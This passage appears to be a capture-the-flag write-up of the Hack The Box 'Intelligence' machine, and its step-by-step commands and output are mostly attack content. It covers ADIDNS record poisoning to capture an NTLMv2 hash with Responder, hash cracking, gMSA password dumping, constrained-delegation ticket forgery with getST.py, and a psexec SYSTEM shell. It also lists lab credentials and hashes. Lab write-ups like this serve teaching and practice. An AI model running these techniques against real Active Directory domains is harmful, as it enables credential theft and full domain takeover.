⛩\> smbclient \\\\intelligence.htb\\IT -U Tiffany.Molina
Enter WORKGROUP\Tiffany.Molina's password:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Mon Apr 19 00:50:55 2021
  ..                                  D        0  Mon Apr 19 00:50:55 2021
  downdetector.ps1                    A     1046  Mon Apr 19 00:50:55 2021

                3770367 blocks of size 4096. 1456235 blocks available
smb: \> get

smb: \> get downdetector.ps1
getting file \downdetector.ps1 of size 1046 as downdetector.ps1 (1.0 KiloBytes/sec) (average 1.0 KiloBytes/sec)

smb: \> exit
```

We have a powershell file, download it and read.

```other
⛩\> cat downdetector.ps1
# Check web server status. Scheduled to run every 5min
Import-Module ActiveDirectory
foreach($record in Get-ChildItem "AD:DC=intelligence.htb,CN=MicrosoftDNS,DC=DomainDnsZones,DC=intelligence,DC=htb" | Where-Object Name -like "web*")  {
try {
$request = Invoke-WebRequest -Uri "http://$($record.Name)" -UseDefaultCredentials
if(.StatusCode -ne 200) {
Send-MailMessage -From 'Ted Graves <Ted.Graves@intelligence.htb>' -To 'Ted Graves <Ted.Graves@intelligence.htb>' -Subject "Host: $($record.Name) is down"
}
} catch {}
}
```

Schedule job is running every 5 mins, it check for DNS records locally and if any of these records start with ‘web*’ then it will request the DNS record via HTTP request using current user’s credentials (probably TED). If the response code is not 200 (OK) then it will send an email to TED user mentioning that the host (DNS) is down.

If we map a DNS record to our own host (IP) and when the HTTP request is made to check the status of the DNS then we will receive a request (because our IP is mapped with that DNS) and in turn then we can send NTLM authentication request back to the IP address (target), then target will respond with NTLM_NEGOTIATE request, with that, a three-way NTLM handshake begins. Below is a packet capture of whole process.

![Screen Shot 2021-07-07 at 23.51.40.png](https://res.craft.do/user/full/f2720b1c-ea2b-4053-35cc-fe42cb8a5e5e/doc/D87DA9BF-EF1F-475E-8580-FDCFBAF01926/BBDAF1F0-68A0-406A-A273-C6129CD89EDC_2/Screen%20Shot%202021-07-07%20at%2023.51.40.png)

After NTLMSSP_CHALLENGE process we got the NTLMv2 (net-NTLM) hash and we can crack the hash to get the password of TED user.

[What should NTLM authentication look like at the packet level?](https://www.cisco.com/c/en/us/support/docs/security/web-security-appliance/117931-technote-ntml.html)

> In ADIDNS (Active Directory-Integrated DNS) by default any authenticated user can create new DNS records, as long as there is no record yet for the hostname.

To add a DNS record we will use DNStool.py application from below repository.

[dirkjanm/krbrelayx](https://github.com/dirkjanm/krbrelayx)

```other
⛩\> python3 dnstool.py -u intelligence.htb\\Tiffany.Molina 10.129.95.154 -p NewIntelligenceCorpUser9876 -r web.intelligence.htb -a add -d 10.10.14.14
[-] Connecting to host...
[-] Binding to host
[+] Bind OK
[-] Adding new record
[+] LDAP operation completed successfully
```

I am on personal instance, so web.intelligence.htb is available. If you are on public instance and you get an error ‘Record already exists’ then someone already mapped their IP to the DNS record. You can query any DNS record with the same tool before you add the DNS.

```other
⛩\> python3 dnstool.py -u intelligence.htb\\Tiffany.Molina 10.129.95.154 -p NewIntelligenceCorpUser9876 -r webtest.intelligence.htb -a query
[-] Connecting to host...
[-] Binding to host
[+] Bind OK
[!] Target record not found!
```

As you can see the record does not exist on the domain. If I try the same query with previously added record then it’d give me details of that.

```other
⛩\> python3 dnstool.py -u intelligence.htb\\Tiffany.Molina -p NewIntelligenceCorpUser9876 -r web.intelligence.htb -a query 10.129.95.154
[-] Connecting to host...
[-] Binding to host
[+] Bind OK
[+] Found record web
DC=web,DC=intelligence.htb,CN=MicrosoftDNS,DC=DomainDnsZones,DC=intelligence,DC=htb
Record is tombStoned (inactive)
[+] Record entry:
 - Type: 1 (A) (Serial: 143)
 - Address: 10.10.14.14
DC=web,DC=intelligence.htb,CN=MicrosoftDNS,DC=DomainDnsZones,DC=intelligence,DC=htb
```

As you can see we got the DNS record details. We have already added our DNS record and mapped with our IP address.

Now we need to setup the responder tool to receive HTTP request, once we receive the request then in turn the tool will send an NTLM auth request and hence the three-way NTLM handshake begins.

```other
⛩\> sudo responder -I tun0 -v
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

           NBT-NS, LLMNR & MDNS Responder 3.0.6.0

  Author: Laurent Gaffie (laurent.gaffie@gmail.com)
  To kill this script hit CTRL-C

---------SNIP----------

[+] Listening for events...

[HTTP] Sending NTLM authentication request to 10.129.95.154
[HTTP] GET request from: 10.129.95.154    URL: /
[HTTP] Host             : web
[HTTP] NTLMv2 Client   : 10.129.95.154
[HTTP] NTLMv2 Username : intelligence\Ted.Graves
[HTTP] NTLMv2 Hash     : Ted.Graves::intelligence:84cac92a85806896:E32137CFE46EB24D253732E3D34B27B3:0101000000000000DC8917E25A73D701922C428D80A819D40000000002000800390030004400410001001E00570049004E002D00480032004800450045003900550047003100350059000400140039003000440041002E004C004F00430041004C0003003400570049004E002D00480032004800450045003900550047003100350059002E0039003000440041002E004C004F00430041004C000500140039003000440041002E004C004F00430041004C00080030003000000000000000000000000020000037C7879AD35DA503069050AA4E08EF9EB31AEDD8722DF86090B36B75C3DA2FE90A001000000000000000000000000000000000000900320048005400540050002F007700650062002E0069006E00740065006C006C006900670065006E00630065002E006800740062000000000000000000
```

As the schedule job runs every 5 minutes, we have to wait to get the response. Once we get the response we can see the TED’s NTLMv2 hash.

We have to save the hash in file and crack that hash using HashCat.

```swift
⛩\> hashcat -m 5600 hash_ted_user /usr/share/wordlists/rockyou.txt

---------------SNIP---------------

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

TED.GRAVES::intelligence:84cac92a85806896:e32137cfe46eb24d253732e3d34b27b3:0101000000000000dc8917e25a73d701922c428d80a819d40000000002000800390030004400410001001e00570049004e002d00480032004800450045003900550047003100350059000400140039003000440041002e004c004f00430041004c0003003400570049004e002d00480032004800450045003900550047003100350059002e0039003000440041002e004c004f00430041004c000500140039003000440041002e004c004f00430041004c00080030003000000000000000000000000020000037c7879ad35da503069050aa4e08ef9eb31aedd8722df86090b36b75c3da2fe90a001000000000000000000000000000000000000900320048005400540050002f007700650062002e0069006e00740065006c006c006900670065006e00630065002e006800740062000000000000000000:Mr.Teddy

Session..........: hashcat
Status...........: Cracked
Hash.Name........: NetNTLMv2
```

We got the password of 'Ted' user.  Now we can try the gMSADumper to read the password of ‘svc_int’ (service account).

```other
⛩\> python3 gmsaDumper.py -u Ted.Graves -p Mr.Teddy -d intelligence.htb -l intelligence.htb
Users or groups who can read password for svc_int$:
 > DC$
 > itsupport
svc_int$:::c699eaac79b69357d9dabee3379547e6
```

We got the hash, It’s an NT hash.

```other
⛩\> john svc_int_hash --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (NT [MD4 256/256 AVX2 8x3])
Warning: no OpenMP support for this hash type, consider --fork=2
Press 'q' or Ctrl-C to abort, almost any other key for status
0g 0:00:00:00 DONE (2021-10-21 15:31) 0g/s 19921Kp/s 19921Kc/s 19921KC/s  _ 09..*7¡Vamos!
Session completed
```

I tried to crack the hash to get cleartext password, it didn’t work. Let’s use pass the hash technique to impersonate administrator and get the silver ticket. To generate silver ticket we need one more thing, that is SPN (Service Principle Name).

> TL;DR
SPNs are used by Kerberos authentication to associate a service instance with a service logon account. This allows a client application to request that the service authenticate an account even if the client does not have the account name.

[How Attackers Use Kerberos Silver Tickets to Exploit Systems](https://adsecurity.org/?p=2011)

We will use bloodhound application to dump AD environment to find the SPN.

```other
⛩\> bloodhound-python -u Ted.Graves -p 'Mr.Teddy' -ns 10.10.10.248 -d intelligence.htb -c All
INFO: Found AD domain: intelligence.htb
INFO: Connecting to LDAP server: dc.intelligence.htb
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 2 computers
INFO: Connecting to LDAP server: dc.intelligence.htb
INFO: Found 42 users
INFO: Found 54 groups
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: svc_int.intelligence.htb
INFO: Querying computer: dc.intelligence.htb
WARNING: Could not resolve: svc_int.intelligence.htb: The DNS operation timed out after 3.001584768295288 seconds
INFO: Done in 00M 23S
```

After execution it dumps all the information found in json format.

```other
⛩\> ls -la
total 192
drwxr-xr-x 2 kali kali  4096 Oct 21 15:01 .
drwxr-xr-x 8 kali kali  4096 Oct 21 15:27 ..
-rw-r--r-- 1 kali kali  4984 Oct 21 15:01 20211021150105_computers.json
-rw-r--r-- 1 kali kali  2765 Oct 21 15:01 20211021150105_domains.json
-rw-r--r-- 1 kali kali 85257 Oct 21 15:01 20211021150105_groups.json
-rw-r--r-- 1 kali kali 88419 Oct 21 15:01 20211021150105_users.json
```

We are looking for SPN, so it should in computers.json file.

```other
⛩\> python3 -m json.tool 20211021150105_computers.json | grep -iA 10 svc
                "name": "SVC_INT.INTELLIGENCE.HTB",
                "objectid": "S-1-5-21-4210132550-3389855604-3437519686-1144",
                "domain": "INTELLIGENCE.HTB",
                "highvalue": false,
                "distinguishedname": "CN=svc_int,CN=Managed Service Accounts,DC=intelligence,DC=htb",
                "unconstraineddelegation": false,
                "enabled": true,
                "haslaps": false,
                "lastlogontimestamp": 1634848076,
                "pwdlastset": 1634847529,
                "serviceprincipalnames": [],
                "description": null,
                "operatingsystem": null,
                "allowedtodelegate": [
                    "WWW/dc.intelligence.htb"
```

As you can see the last line, ‘svc_int’ is allowed to delegate with ‘WWW/dc.intelligence.htb’. Now we can able to get the silver ticket.

```other
⛩\> getST.py -hashes :c699eaac79b69357d9dabee3379547e6 -spn WWW/dc.intelligence.htb -impersonate administrator intelligence.htb/svc_int$
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[*] Getting TGT for user
Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)

⛩\> sudo ntpdate 10.10.10.248
21 Oct 23:05:45 ntpdate[406465]: step time server 10.10.10.248 offset +25199.876791 sec
```

TGT’s are time constraint. We need to match our time with servers time.

```other
⛩\> getST.py -hashes :c699eaac79b69357d9dabee3379547e6 -spn WWW/dc.intelligence.htb -impersonate administrator intelligence.htb/svc_int$
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[*] Getting TGT for user
[*] Impersonating administrator
[*]     Requesting S4U2self
[*]     Requesting S4U2Proxy
[*] Saving ticket in administrator.ccache
```

We got the silver ticket and it is saved in current directory.

```other
⛩\> export KRB5CCNAME=`pwd`/administrator.ccache
```

Export the saved ticket, so thatKerberos clients can use it.

```other
⛩\> psexec.py -k -no-pass intelligence.htb/administrator@dc.intelligence.htb
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[*] Requesting shares on dc.intelligence.htb.....
[*] Found writable share ADMIN$
[*] Uploading file EUInOlsb.exe
[*] Opening SVCManager on dc.intelligence.htb.....
[*] Creating service hWPX on dc.intelligence.htb.....
[*] Starting service hWPX.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.17763.1879]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
nt authority\system
```

We got system level access. We can now read the root flag.

```other
C:\Windows\system32>type c:\users\administrator\desktop\root.txt
226c0b6b146702f7cf60bd69fbc82928
```

We successfully root the box.

